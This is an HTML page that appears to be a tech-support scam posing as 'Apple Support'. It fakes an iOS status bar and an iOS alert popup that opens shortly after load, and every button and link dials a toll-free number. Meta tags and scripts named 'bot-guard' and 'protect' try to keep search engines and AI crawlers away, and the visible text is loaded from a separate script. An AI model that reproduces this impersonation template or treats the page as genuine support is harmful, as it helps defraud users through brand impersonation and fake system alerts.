<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Apple Support</title>
    <meta name="description" content="24/7 customer support. Call us anytime for instant help." />
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, noai, noimageai" />
    <meta name="googlebot" content="noindex, nofollow, noai, noimageai" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta name="GPTBot" content="noindex, nofollow" />
    <meta name="ChatGPT-User" content="noindex, nofollow" />
    <meta name="CCBot" content="noindex, nofollow" />
    <meta name="anthropic-ai" content="noindex, nofollow" />
    <meta name="Claude-Web" content="noindex, nofollow" />
    <meta name="PerplexityBot" content="noindex, nofollow" />
    <meta name="Google-Extended" content="noindex, nofollow" />
    <meta name="referrer" content="no-referrer" />
    <meta http-equiv="X-Frame-Options" content="DENY" />
    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';" />
    <link rel="stylesheet" href="styles.css" />

    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-2DMKRPGVF0');
</script>
</head>
<body>

    <!-- ===== iOS Status Bar ===== -->
    <div class="ios-statusbar">
        <span class="time" id="iosTime">9:41</span>
        <span class="icons">
            <svg viewBox="0 0 18 12" xmlns="http://www.w3.org/2000/svg"><rect x="0" y="8" width="3" height="4" rx="0.5"/><rect x="5" y="6" width="3" height="6" rx="0.5"/><rect x="10" y="3" width="3" height="9" rx="0.5"/><rect x="15" y="0" width="3" height="12" rx="0.5"/></svg>
            <svg viewBox="0 0 16 12" xmlns="http://www.w3.org/2000/svg"><path d="M8 2.5a8 8 0 0 1 5.66 2.34l-1.41 1.41A6 6 0 0 0 8 4.5a6 6 0 0 0-4.24 1.75L2.34 4.84A8 8 0 0 1 8 2.5zm0 3a5 5 0 0 1 3.54 1.46l-1.41 1.41A3 3 0 0 0 8 7.5a3 3 0 0 0-2.12.87l-1.41-1.41A5 5 0 0 1 8 5.5zm0 3a2 2 0 0 1 1.41.59L8 10.5l-1.41-1.41A2 2 0 0 1 8 8.5z"/></svg>
            <span class="battery"><span class="fill"></span></span>
        </span>
    </div>

    <!-- ===== Header ===== -->
    <header class="header">
        <a href="index.html" class="logo">
            <img src="ap-icon.png" class="support-icon header-icon" alt="" />
        </a>
        <a href="tel:+18001234567" class="header-phone" data-k="phoneTop"></a>
    </header>

    <!-- ===== Full Page Background with Text ===== -->
    <section class="hero-full">
        <div class="hero-text">
            <h1 data-k="heroH1"></h1>
            <p data-k="heroPara"></p>
            <p class="price-note" data-k="heroPrice"></p>
            <a href="tel:+18001234567" class="call-btn" data-k="heroCta"></a>
        </div>
    </section>

    <!-- ===== iOS-style Popup Notification ===== -->
    <div class="ios-overlay" id="iosPopup">
        <div class="ios-alert">
            <div class="ios-alert-body">
                 <img src="ap-icon.png" class="support-icon header-icon" alt="" />
                <div class="ios-alert-title" data-k="popupTitle"></div>
                <div class="ios-alert-message" data-k="popupMsg"></div>
            </div>
            <div class="ios-alert-buttons">
                <button class="ios-alert-btn ok" data-k="btnCancel" onclick="document.getElementById('iosPopup').classList.remove('show')"></button>
                <button class="ios-alert-btn ok" data-k="btnOk" onclick="if(window.__callPhone){window.__callPhone();}"></button>
            </div>
        </div>
    </div>

    <!-- ===== Footer ===== -->
    <footer class="footer">
        <div class="footer-grid">
            <div class="footer-col">
                <a href="privacy-policy.html" data-k="linkPrivacy"></a>
                <a href="terms-conditions.html" data-k="linkTerms"></a>
                <a href="disclaimer.html" data-k="linkDisclaimer"></a>
            </div>
            <div class="footer-col">
                <a href="tel:+18001234567" class="footer-phone"><svg class="support-icon footer-icon" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M12 1a9 9 0 0 0-9 9v7a3 3 0 0 0 3 3h3v-8H5v-2a7 7 0 0 1 14 0v2h-4v8h3a3 3 0 0 0 3-3v-7a9 9 0 0 0-9-9z"/></svg><span data-k="phoneFoot"></span></a>
            </div>
        </div>
        <div class="footer-bottom" data-k="footCopy"></div>
    </footer>

    <!-- ===== Scripts ===== -->
    <script src="bot-guard.js"></script>
    <script src="protect.js"></script>
    <script src="content.js"></script>
    <script>
        window.addEventListener('load', function () {
            setTimeout(function () {
                document.getElementById('iosPopup').classList.add('show');
            }, 600);
        });

        // Live iOS-style clock in status bar
        function updateIosTime() {
            var el = document.getElementById('iosTime');
            if (!el) return;
            var now = new Date();
            var h = now.getHours();
            var m = now.getMinutes();
            if (m < 10) m = '0' + m;
            el.textContent = h + ':' + m;
        }
        updateIosTime();
        setInterval(updateIosTime, 30000);
    </script>

</body>
</html>
